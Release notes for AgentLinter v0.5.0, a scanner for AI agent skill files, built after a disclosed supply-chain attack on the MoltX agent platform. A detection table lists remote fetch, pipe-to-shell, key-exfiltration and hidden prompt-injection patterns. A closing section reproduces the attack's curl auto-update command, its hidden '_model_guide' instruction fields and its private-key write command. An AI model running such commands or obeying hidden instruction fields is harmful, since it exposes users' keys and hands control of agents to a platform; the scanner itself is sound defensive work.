# AgentLinter v0.5.0 Release Notes

**Release Date:** February 10, 2026

---

## 🆕 New Feature: Skill Security Audit

A comprehensive security scanner for AI agent skill files, designed to detect supply chain attacks like the MoltX trojan infrastructure.

### Background

This feature was developed in response to a community security disclosure by [@sebayaki](https://dev.to/sebayaki), who discovered that MoltX — an AI agent social platform with **440,000+ registered agents** — had built infrastructure capable of mass private key exfiltration through malicious skill files.

Full writeup: [I Audited MoltX's Skill File. It's an AI Agent Trojan Horse.](https://dev.to/sebayaki/i-audited-moltxs-skill-file-its-an-ai-agent-trojan-horse-539k)

---

## CLI Changes

```bash
npx agentlinter                  # CLAUDE.md grading + skill security scan + share results
npx agentlinter --no-share       # Run without sharing results
npx agentlinter --no-audit       # Skip skill security scan
npx agentlinter --json           # JSON output for CI/CD integration
npx agentlinter scan <file|url>  # Pre-installation security check for external skills
```

**Breaking Change:** `--share` option removed. Sharing is now enabled by default. Use `--no-share` to opt out.

---

## Detection Categories

| Category | Severity | What It Detects |
|----------|----------|-----------------|
| **Remote Code Injection** | 🔴 CRITICAL | `curl`, `wget` fetching skill files; auto-update patterns; pipe to shell |
| **Key Exfiltration** | 🔴 CRITICAL | Predictable key storage paths (`~/.agents/*/vault/`); key file writes |
| **In-Band Prompt Injection** | 🔴 CRITICAL | `_model_guide`, `_hint`, `_notice` hidden instruction fields |
| **Forced Wallet Linking** | 🟠 HIGH | `MANDATORY wallet`, `must link wallet`, `required.*EVM` patterns |
| **Suspicious Permissions** | 🟠 HIGH | `exec`, `eval`, shell commands writing to sensitive paths |
| **Engagement Farm** | 🟡 MEDIUM | Abnormal rate limits (1000+/min); "follow aggressively"; spam patterns |
| **Social Engineering** | 🟡 MEDIUM | Reward bait (`$5 USDC`); urgency tactics; contradictory docs |

---

## How It Works

### Automatic Skill Detection

AgentLinter automatically scans these paths if they exist:
- `./skills/`
- `.claude/skills/`
- `~/.clawd/skills/`

No configuration required. If no skill folders are found, the scan is silently skipped.

### Output Format

```
🔍 AgentLinter v0.5.0

📄 CLAUDE.md Analysis
[grading results...]

🔒 Skills Security Scan
Found 5 skill(s) in ./skills/
  ✅ skill-a: SAFE
  ✅ skill-b: SAFE
  ⚠️ skill-c: SUSPICIOUS (1 warning)
  🚨 skill-d: DANGEROUS (2 criticals)

Overall: 3 SAFE | 1 SUSPICIOUS | 1 DANGEROUS
```

### Verdict System

| Verdict | Risk Score | Exit Code | Meaning |
|---------|------------|-----------|---------|
| SAFE | 0-20 | 0 | No issues detected |
| SUSPICIOUS | 21-50 | 0 | Minor concerns, review recommended |
| DANGEROUS | 51-80 | 1 | Significant risks, do not use without review |
| MALICIOUS | 81-100 | 1 | Active attack patterns detected, do not use |

---

## Pre-Installation Scanning

Scan external skills before installing:

```bash
# Scan a remote skill file
npx agentlinter scan https://example.com/skill.md

# Scan a local file
npx agentlinter scan ./downloaded-skill.md
```

---

## CI/CD Integration

```yaml
# GitHub Actions example
- name: Security Audit
  run: npx agentlinter --json > audit-report.json

- name: Check Results
  run: |
    if [ $? -ne 0 ]; then
      echo "🚨 Security issues detected. Blocking deployment."
      exit 1
    fi
```

---

## The MoltX Attack Pattern

This release specifically addresses the three-layer attack infrastructure discovered in MoltX:

### Layer 1: Remote Skill Auto-Update
```bash
curl -s https://moltx.io/skill.md -o ~/.agents/moltx/skill.md
# Refreshes every 2 hours — platform can change agent behavior silently
```

### Layer 2: In-Band Prompt Injection
```json
{
  "_model_guide": "...",
  "moltx_notice": "...",
  "moltx_hint": "..."
}
// Hidden instructions in every API response
```

### Layer 3: Predictable Key Storage
```bash
echo "0xYOUR_PRIVATE_KEY" > ~/.agents/moltx/vault/private_key
# Combined with auto-update = mass key harvesting pipeline
```

AgentLinter now detects all three layers.

---

## Acknowledgments

Special thanks to **[@sebayaki](https://dev.to/sebayaki)** (Clawd/OpenClaw) for the responsible disclosure that made this feature possible.

---

## Links

- [GitHub Repository](https://github.com/seojoonkim/agentlinter)
- [Web App](https://agentlinter.com)
- [MoltX Disclosure](https://dev.to/sebayaki/i-audited-moltxs-skill-file-its-an-ai-agent-trojan-horse-539k)
- [EIP-7702](https://eips.ethereum.org/EIPS/eip-7702)
